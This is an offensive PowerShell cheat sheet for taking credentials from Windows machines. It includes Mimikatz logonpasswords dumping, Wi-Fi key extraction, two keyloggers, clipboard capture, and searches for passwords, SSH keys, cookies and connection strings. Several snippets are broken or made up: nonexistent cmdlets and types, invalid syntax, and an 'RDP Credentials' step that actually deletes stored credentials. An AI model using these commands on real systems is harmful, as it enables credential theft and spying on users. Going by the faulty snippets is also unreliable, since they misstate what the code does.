# Credential Extraction

### 1) Stored Credentials

    $cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password

### 2) Capture Keystrokes

    $path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-ObjectSystem.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path

### 3) Wi-Fi profiles and passwords

    netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }

### 4) Browser saved passwords

    Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser_passwords.txt

### 5) Network Sniffing

    $adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name 'Session1' -CaptureMode SaveToFile -LocalFilePath 'C:\temp\network_capture.etl'; Add-NetEventPacketCaptureProvider -SessionName 'Session1' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name 'Session1'; Stop-NetEventSession -Name 'Session1' after 60

### 6) Mimikatz

    Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt

### 7) Windows Credential Manager

    $credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password

### 8) Retrieve passwords from files

    Select-String -Path C:\Users\*\Documents\*.txt -Pattern 'password' -CaseSensitive

### 9) Windows Services

    Get-WmiObject win32_service | Where-Object {$_.StartName -like '*@*'} | Select-Object Name, StartName, DisplayName

### 10) RDP Credentials

    cmdkey /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }

### 11) Browser Cookies

    $env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Get-Item

### 12) IIS Application Pools

    Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel

### 13) Configuration files

    Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'password='

### 14) Scheduled Tasks

    Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal

### 15) SSH Keys

    Get-ChildItem -Path C:\Users\*\.ssh\id_rsa -Recurse

### 16) Database Connection Strings

    Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -CaseSensitive

### 17) Windows API Keylogger

    Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); } "@ while ($true) {Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }

### 18) Windows API Clipboard Access

    Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; using System.Text;
    public class ClipboardAPI { [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr
    hWndNewOwner); [DllImport("user32.dll")] public static extern bool CloseClipboard();
    [DllImport("user32.dll")] public static extern IntPtr GetClipboardData(uint uFormat);
    [DllImport("kernel32.dll")] public static extern IntPtr GlobalLock(IntPtr hMem);
    [DllImport("kernel32.dll")] public static extern bool GlobalUnlock(IntPtr hMem);
    [DllImport("kernel32.dll")] public static extern int GlobalSize(IntPtr hMem); } "@
    [ClipboardAPI]::OpenClipboard([IntPtr]::Zero) $clipboardData = [ClipboardAPI]::GetClipboardData(13) #
    CF_TEXT format $gLock = [ClipboardAPI]::GlobalLock($clipboardData) $size =
    [ClipboardAPI]::GlobalSize($clipboardData) $buffer = New-Object byte[] $size
    [System.Runtime.InteropServices.Marshal]::Copy($gLock, $buffer, 0, $size)
    [ClipboardAPI]::GlobalUnlock($gLock) [ClipboardAPI]::CloseClipboard()
    [System.Text.Encoding]::Default.GetString($buffer)



